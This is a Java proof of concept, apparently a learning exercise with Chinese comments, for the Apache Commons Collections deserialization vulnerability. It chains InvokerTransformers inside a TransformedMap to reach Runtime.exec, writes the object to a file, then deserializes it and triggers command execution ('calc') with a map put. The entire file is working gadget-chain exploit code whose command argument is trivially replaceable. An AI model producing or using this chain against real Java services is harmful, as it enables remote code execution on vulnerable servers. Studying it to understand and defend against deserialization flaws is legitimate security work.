package com.zxd.commoncollection;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;


public class UseTransformedMap {

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 使用Class类来执行
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                // 拿到getRuntime方法
                new InvokerTransformer("getDeclaredMethod",
                        new Class[]{String.class,Class[].class},
                        new String[]{"getRuntime",null}),
                // 获取runtime实例
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                //正常使用
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put("key1", "value1");
        Map myMap = TransformedMap.decorate(map,null,chainedTransformer);
//        Map myMap = TransformedMap.decorate(map,chainedTransformer,null);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("tm.cer");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(myMap);
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();

        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream("tm.cer");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        Map mapObj = (Map) objectInputStream.readObject();
        //触发漏洞
        // 这一步会弹出计算器
        mapObj.put("key2", "value2");






    }

}
